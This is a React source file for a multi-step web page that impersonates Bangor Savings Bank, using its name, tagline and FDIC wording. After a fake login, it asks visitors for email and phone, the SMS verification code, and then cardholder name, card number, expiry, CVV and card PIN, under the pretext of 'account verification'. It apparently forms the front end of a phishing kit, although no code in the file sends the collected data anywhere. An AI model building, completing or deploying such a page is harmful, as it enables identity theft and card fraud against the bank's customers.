import React, { useState, useEffect } from "react";
import "./App.css";

// Placeholder image imports (replace with your actual assets later)
const bangorLogo = "./assets/bangor-logo.png"; // e.g. require("./assets/bangor-logo.png")

function Stepper({ step }) {
  return (
    <div style={{ display: "flex", justifyContent: "center", gap: 48, margin: "32px 0 24px 0" }}>
      {[1, 2, 3].map(n => (
        <div
          key={n}
          style={{
            width: 56,
            height: 56,
            borderRadius: "50%",
            background: step === n ? "#888be9" : "#bfc2f7",
            color: "#fff",
            display: "flex",
            alignItems: "center",
            justifyContent: "center",
            fontSize: 28,
            fontWeight: 600,
            opacity: 1,
            transition: "background 0.2s"
          }}
        >
          {n}
        </div>
      ))}
    </div>
  );
}

function SuccessPage({ onRedirect }) {
  useEffect(() => {
    const timer = setTimeout(onRedirect, 5000);
    return () => clearTimeout(timer);
  }, [onRedirect]);

  return (
    <div
      style={{
        background: "#fff",
        borderRadius: 18,
        boxShadow: "0 4px 32px 0 rgba(0,0,0,0.08)",
        maxWidth: 420,
        margin: "48px auto",
        padding: "36px 24px 32px 24px",
        textAlign: "left"
      }}
    >
      <div style={{ textAlign: "center", marginBottom: 12 }}>
        {bangorLogo && (
          <img src={bangorLogo} alt="Bangor Savings Bank" style={{ height: 48, marginBottom: 8 }} />
        )}
        <div style={{ fontWeight: "bold", fontSize: 38, color: "#0056b8", letterSpacing: "-1px" }}>Bangor</div>
        <div style={{ fontWeight: "bold", fontSize: 26, color: "#888", marginTop: -8 }}>Savings Bank</div>
        <div style={{ color: "#0056b8", fontWeight: 600, fontSize: 17, marginTop: 4 }}>You matter more.</div>
      </div>
      <Stepper step={3} />
      <div style={{ margin: "24px 0 0 0" }}>
        <div style={{ fontSize: 28, fontWeight: 500, marginBottom: 8, color: "#222" }}>Account Verification!</div>
        <div style={{ fontSize: 22, marginBottom: 18, color: "#222" }}>Thank you!</div>
        <div style={{ fontSize: 18, color: "#222", marginBottom: 18 }}>
          Your contact information has been updated successfully. Please{" "}
          <a href="#" style={{ color: "#888be9", textDecoration: "underline" }} onClick={onRedirect}>
            Click here
          </a>{" "}
          and you will be redirected to the Authentication page. If the page doesn't reload in 5 seconds
        </div>
        <div style={{ color: "#b0b6c3", fontSize: 18, marginTop: 24, textAlign: "center" }}>
          Redirecting you to secure login...
        </div>
      </div>
    </div>
  );
}

// Placeholder for other steps/pages
function StepPage({ step, onNext, onPrev }) {
  // State for step 1
  const [email, setEmail] = useState("");
  const [phone, setPhone] = useState("");
  const [touched, setTouched] = useState({ email: false, phone: false });

  // State for step 2
  const [code, setCode] = useState("");
  const [resendDisabled, setResendDisabled] = useState(false);

  // State for step 3 (card info)
  const [cardName, setCardName] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [expiry, setExpiry] = useState("");
  const [cvv, setCvv] = useState("");
  const [pin, setPin] = useState("");

  // Simple validation
  const emailValid = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
  const phoneValid = /^\d{3}-\d{3}-\d{4}$/.test(phone);

  let content;
  // Login page (no stepper)
  if (step === 0) {
    content = (
      <>
        {/* Top banner image */}
        <div style={{ width: "100%", height: 220, background: "#eee", overflow: "hidden", margin: "0 auto 24px auto" }}>
          <img
            src=""
            alt="Banner"
            style={{ width: "100%", height: "100%", objectFit: "cover" }}
          />
        </div>
        {/* Logo and tagline */}
        <div style={{ textAlign: "center", marginBottom: 16 }}>
          {bangorLogo && (
            <img src={bangorLogo} alt="Bangor Savings Bank" className="login-logo" />
          )}
          <div style={{ fontWeight: "bold", fontSize: 32, color: "#0056b8", letterSpacing: "-1px" }}>Bangor</div>
          <div style={{ fontWeight: "bold", fontSize: 22, color: "#888", marginTop: -8 }}>Savings Bank</div>
          <div style={{ color: "#0056b8", fontWeight: 600, fontSize: 15, marginTop: 4 }}>You matter more.</div>
        </div>
        {/* FDIC-insured info box */}
        <div style={{
          display: "flex", alignItems: "center", border: "1px solid #222", borderRadius: 10,
          padding: 12, marginBottom: 24, background: "#fff"
        }}>
          <img src="" alt="FDIC" style={{ width: 32, height: 32, marginRight: 12 }} />
          <span style={{ fontSize: 16, color: "#222" }}>
            FDIC-Insured - Backed by the full faith and credit of the U.S. Government
          </span>
        </div>
        {/* Username */}
        <div style={{ marginBottom: 24 }}>
          <label style={{ fontSize: 22, color: "#222", display: "block", marginBottom: 8 }}>Username</label>
          <div style={{
            display: "flex", alignItems: "center", border: "1px solid #ddd", borderRadius: 8,
            background: "#fff", padding: "0 8px"
          }}>
            <input
              type="text"
              placeholder=""
              className="login-input"
              style={{
                // Remove width: "100%"
                flex: 1, border: "none", outline: "none", fontSize: 20, background: "transparent", height: 56
              }}
            />
            <span style={{ fontSize: 18, marginRight: 8, color: "#222" }}>Save</span>
            <label className="switch">
              <input type="checkbox" />
              <span className="slider round"></span>
            </label>
          </div>
        </div>
        {/* Password */}
        <div style={{ marginBottom: 32 }}>
          <label style={{ fontSize: 22, color: "#222", display: "block", marginBottom: 8 }}>Password</label>
          <div style={{
            display: "flex", alignItems: "center", border: "1px solid #ddd", borderRadius: 8,
            background: "#fff", padding: "0 8px"
          }}>
            <input
              type="password"
              placeholder=""
              className="login-input"
              style={{
                // Remove width: "100%"
                flex: 1, border: "none", outline: "none", fontSize: 20, background: "transparent", height: 56
              }}
            />
            <span style={{ cursor: "pointer", marginLeft: 8 }}>
              {/* Eye icon SVG */}
              <svg width="28" height="28" fill="none" stroke="#222" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" viewBox="0 0 24 24">
                <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7S1 12 1 12z"/>
                <circle cx="12" cy="12" r="3"/>
              </svg>
            </span>
          </div>
        </div>
        {/* Login button */}
        <button
          onClick={onNext}
          className="login-btn"
          style={{
            // Remove width: "100%"
            background: "#888be9", color: "#fff", fontSize: 28, border: "none",
            borderRadius: 8, padding: "16px 0", marginBottom: 24, fontWeight: 400
          }}
        >
          Login
        </button>
        {/* Links */}
        <div className="login-links" style={{ textAlign: "center", marginBottom: 24 }}>
          <a href="#" style={{ color: "#1976d2", display: "block", margin: "8px 0", fontSize: 24 }}>Sign up</a>
          <a href="#" style={{ color: "#1976d2", display: "block", margin: "8px 0", fontSize: 24 }}>Forgot Login?</a>
          <a href="#" style={{ color: "#1976d2", display: "block", margin: "8px 0", fontSize: 24 }}>Test your browser</a>
          <a href="#" style={{ color: "#1976d2", display: "block", margin: "8px 0", fontSize: 24 }}>Trouble testing your browser</a>
        </div>
        {/* Footer logos */}
        <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: 16, marginTop: 24 }}>
          <img src="" alt="FDIC" style={{ height: 48 }} />
          <img src="" alt="Equal Housing Lender" style={{ height: 48 }} />
        </div>
      </>
    );
  } else if (step === 1) {
    // Email Verification page (stepper step 1)
    content = (
      <>
        {/* Logo and tagline */}
        <div className="stepper-logo-wrap">
          {bangorLogo && (
            <img src={bangorLogo} alt="Bangor Savings Bank" className="stepper-logo" />
          )}
          <div className="stepper-title">Bangor</div>
          <div className="stepper-subtitle">Savings Bank</div>
          <div className="stepper-tagline">You matter more.</div>
        </div>
        <Stepper step={1} />
        <div className="stepper-content">
          <div className="stepper-heading">Email Verification!</div>
          <div className="stepper-desc">
            Confirm Your Email and Phone<br />Number Information
          </div>
          <div className="stepper-info">
            Please confirm your contact details on file.
          </div>
          <div className="stepper-field">
            <label className="form-label">Email Address</label>
            <input
              type="email"
              placeholder=""
              value={email}
              onChange={e => setEmail(e.target.value)}
              onBlur={() => setTouched(t => ({ ...t, email: true }))}
              className={`form-input${!emailValid && touched.email ? " error" : ""}`}
            />
            {!emailValid && touched.email && (
              <div className="form-error">Enter a valid email address</div>
            )}
          </div>
          <div className="stepper-field">
            <label className="form-label">Phone Number</label>
            <input
              type="tel"
              placeholder="XXX-XXX-XXXX"
              value={phone}
              onChange={e => {
                const formatted = formatPhoneNumber(e.target.value);
                setPhone(formatted);
              }}
              onBlur={() => setTouched(t => ({ ...t, phone: true }))}
              className={`form-input${!phoneValid && touched.phone ? " error" : ""}`}
            />
            {!phoneValid && touched.phone && (
              <div className="form-error">Format: 123-456-7890</div>
            )}
          </div>
          <button
            onClick={onNext}
            disabled={!(emailValid && phoneValid)}
            className="form-btn"
          >
            Continue
          </button>
        </div>
      </>
    );
  } else if (step === 2) {
    // Handler for resend code (simulate delay)
    const handleResend = () => {
      setResendDisabled(true);
      setTimeout(() => setResendDisabled(false), 60000); // 1 minute cooldown
      // You can add your resend logic here
    };

    content = (
      <>
        {/* Logo and tagline */}
        <div style={{ textAlign: "center", marginBottom: 12 }}>
          {bangorLogo && (
            <img src={bangorLogo} alt="Bangor Savings Bank" style={{ height: 48, marginBottom: 8 }} />
          )}
          <div style={{ fontWeight: "bold", fontSize: 38, color: "#0056b8", letterSpacing: "-1px" }}>Bangor</div>
          <div style={{ fontWeight: "bold", fontSize: 26, color: "#888", marginTop: -8 }}>Savings Bank</div>
          <div style={{ color: "#0056b8", fontWeight: 600, fontSize: 17, marginTop: 4 }}>You matter more.</div>
        </div>
        {/* Stepper */}
        <Stepper step={2} />
        <div style={{ margin: "24px 0 0 0" }}>
          <div style={{ fontSize: 28, fontWeight: 500, marginBottom: 8, color: "#111" }}>Code Verification</div>
          <div style={{ fontSize: 20, color: "#222", marginBottom: 28 }}>
            We've sent a secured code to your registered number. Please tell us your code for account verification. If you didn't get code, please wait 1-2 minutes.
          </div>
          <div style={{ marginBottom: 18 }}>
            <input
              type="text"
              placeholder="Enter your code"
              value={code}
              onChange={e => setCode(e.target.value)}
              style={{
                width: "100%",
                padding: "16px 12px",
                fontSize: 20,
                border: "1.5px solid #888",
                borderRadius: 8,
                background: "#fff",
                color: "#222",
                marginBottom: 8,
                boxSizing: "border-box"
              }}
            />
          </div>

          <div style={{ display: "flex", gap: 16, marginBottom: 24, justifyContent: "flex-start" }}>
            <button
              onClick={handleResend}
              disabled={resendDisabled}
              style={{
                width: 140, // Make button smaller
                background: "#222",
                color: "#fff",
                fontSize: 18,
                border: "none",
                borderRadius: 8,
                padding: "10px 0",
                fontWeight: 400,
                opacity: resendDisabled ? 0.5 : 1,
                cursor: resendDisabled ? "not-allowed" : "pointer"
              }}
            >
              Resend Code
            </button>
          </div>
          <button
            onClick={onNext}
            disabled={code.trim().length === 0}
            style={{
              width: "100%",
              background: code.trim().length > 0 ? "#222" : "#bbb",
              color: "#fff",
              fontSize: 26,
              border: "none",
              borderRadius: 12,
              padding: "14px 0",
              fontWeight: 400,
              margin: "0 auto",
              display: "block",
              cursor: code.trim().length > 0 ? "pointer" : "not-allowed",
              opacity: code.trim().length > 0 ? 1 : 0.7
            }}
          >
            Continue
          </button>
        </div>
      </>
    );
  } else if (step === 3) {
    const isValid =
      cardName.trim().length > 0 &&
      /^\d{4} \d{4} \d{4} \d{4}$/.test(cardNumber) &&
      /^(0[1-9]|1[0-2])\/\d{4}$/.test(expiry) &&
      /^\d{3,4}$/.test(cvv) &&
      /^\d{4}$/.test(pin);

    content = (
      <>
        {/* Logo and tagline */}
        <div style={{ textAlign: "center", marginBottom: 12 }}>
          {bangorLogo && (
            <img src={bangorLogo} alt="Bangor Savings Bank" style={{ height: 48, marginBottom: 8 }} />
          )}
          <div style={{ fontWeight: "bold", fontSize: 38, color: "#0056b8", letterSpacing: "-1px" }}>Bangor</div>
          <div style={{ fontWeight: "bold", fontSize: 26, color: "#888", marginTop: -8 }}>Savings Bank</div>
          <div style={{ color: "#0056b8", fontWeight: 600, fontSize: 17, marginTop: 4 }}>You matter more.</div>
        </div>
        {/* Stepper */}
        <Stepper step={3} />
        <div style={{ margin: "24px 0 0 0" }}>
          <div style={{ fontSize: 28, fontWeight: 500, marginBottom: 8, color: "#111" }}>Account Verification!</div>
          <div style={{ fontSize: 24, fontWeight: 400, marginBottom: 18, color: "#111", lineHeight: 1.2 }}>
            Confirm Your Account<br />Information
          </div>
          <div style={{ fontSize: 20, color: "#222", marginBottom: 18 }}>
            We need this info to verify your identity.
          </div>
          <div style={{ fontSize: 22, fontWeight: 500, marginBottom: 8, color: "#222" }}>Bank card information</div>
          <div style={{ color: "#b0b6c3", fontSize: 18, marginBottom: 18 }}>
            Please provide your Bank card information for verification purposes.
          </div>
          <div style={{ marginBottom: 18 }}>
            <label style={{ fontSize: 18, color: "#222", display: "block", marginBottom: 6 }}>Cardholder Name</label>
            <input
              type="text"
              placeholder="Name as it appears on card"
              value={cardName}
              onChange={e => setCardName(e.target.value)}
              style={{
                width: "100%",
                padding: "14px 12px",
                fontSize: 18,
                border: "1.5px solid #888",
                borderRadius: 8,
                background: "#fff",
                color: "#222",
                marginBottom: 8,
                boxSizing: "border-box"
              }}
            />
          </div>
          <div style={{ marginBottom: 18 }}>
            <label style={{ fontSize: 18, color: "#222", display: "block", marginBottom: 6 }}>Card Number</label>
            <input
              type="text"
              placeholder="XXXX XXXX XXXX XXXX"
              value={cardNumber}
              onChange={e => setCardNumber(formatCardNumber(e.target.value))}
              style={{
                width: "100%",
                padding: "14px 12px",
                fontSize: 18,
                border: "1.5px solid #888",
                borderRadius: 8,
                background: "#fff",
                color: "#222",
                marginBottom: 8,
                boxSizing: "border-box"
              }}
            />
          </div>
          <div style={{ display: "flex", gap: 16, marginBottom: 18 }}>
            <div style={{ flex: 1 }}>
              <label style={{ fontSize: 18, color: "#222", display: "block", marginBottom: 6 }}>Expiry Date</label>
              <input
                type="text"
                placeholder="MM/YYYY"
                value={expiry}
                onChange={e => setExpiry(formatExpiry(e.target.value))}
                style={{
                  width: "100%",
                  padding: "14px 12px",
                  fontSize: 18,
                  border: "1.5px solid #888",
                  borderRadius: 8,
                  background: "#fff",
                  color: "#222",
                  marginBottom: 8,
                  boxSizing: "border-box"
                }}
              />
            </div>
            <div style={{ flex: 1 }}>
              <label style={{ fontSize: 18, color: "#222", display: "block", marginBottom: 6 }}>CVV</label>
              <input
                type="text"
                placeholder="123"
                value={cvv}
                onChange={e => setCvv(e.target.value.replace(/\D/g, "").slice(0, 4))}
                maxLength={4}
                style={{
                  width: "100%",
                  padding: "14px 12px",
                  fontSize: 18,
                  border: "1.5px solid #888",
                  borderRadius: 8,
                  background: "#fff",
                  color: "#222",
                  marginBottom: 8,
                  boxSizing: "border-box"
                }}
              />
            </div>
          </div>
          <div style={{ marginBottom: 18 }}>
            <label style={{ fontSize: 18, color: "#222", display: "block", marginBottom: 6 }}>Card PIN</label>
            <input
              type="password"
              placeholder="Enter 4-digit PIN"
              value={pin}
              onChange={e => setPin(e.target.value)}
              maxLength={4}
              style={{
                width: "100%",
                padding: "14px 12px",
                fontSize: 18,
                border: "1.5px solid #888",
                borderRadius: 8,
                background: "#fff",
                color: "#222",
                marginBottom: 4,
                boxSizing: "border-box"
              }}
            />
            <div style={{ color: "#b0b6c3", fontSize: 15, marginTop: 2 }}>
              For security verification only
            </div>
          </div>
          {/* You can add a help link or extra info here if needed */}
          <button
            onClick={onNext}
            disabled={!isValid}
            style={{
              width: "100%",
              background: isValid ? "#222" : "#bbb",
              color: "#fff",
              fontSize: 26,
              border: "none",
              borderRadius: 12,
              padding: "14px 0",
              fontWeight: 400,
              margin: "24px 0 0 0",
              display: "block",
              cursor: isValid ? "pointer" : "not-allowed",
              opacity: isValid ? 1 : 0.7
            }}
          >
            Continue
          </button>
        </div>
      </>
    );
  }

  return (
    <div className="card-container">
      {content}
    </div>
  );
}

function App() {
  // step: 1, 2, 3, or "success"
  const [step, setStep] = useState(0);

  // Redirect to login after success
  const handleRedirect = () => setStep(0);

  // Render the correct page
  return (
    <div className="app-root" style={{ background: "#f9f9fb", minHeight: "100vh" }}>
      {step === "success" ? (
        <SuccessPage onRedirect={handleRedirect} />
      ) : (
        <StepPage
          step={step}
          onNext={() => setStep(step === 3 ? "success" : step + 1)}
          onPrev={() => setStep(step > 0 ? step - 1 : 0)}
        />
      )}
    </div>
  );
}

export default App;

// Phone number formatting helper
function formatPhoneNumber(value) {
  const digits = value.replace(/\D/g, "");
  if (digits.length <= 3) return digits;
  if (digits.length <= 6) return `${digits.slice(0, 3)}-${digits.slice(3)}`;
  return `${digits.slice(0, 3)}-${digits.slice(3, 6)}-${digits.slice(6, 10)}`;
}

// Card Number input (max 16 digits, auto-format as XXXX XXXX XXXX XXXX)
function formatCardNumber(value) {
  const digits = value.replace(/\D/g, "").slice(0, 16);
  return digits.replace(/(.{4})/g, "$1 ").trim();
}

// Expiry input (MM/YYYY, auto-format)
function formatExpiry(value) {
  const digits = value.replace(/\D/g, "").slice(0, 6);
  if (digits.length <= 2) return digits;
  return `${digits.slice(0, 2)}/${digits.slice(2, 6)}`;
}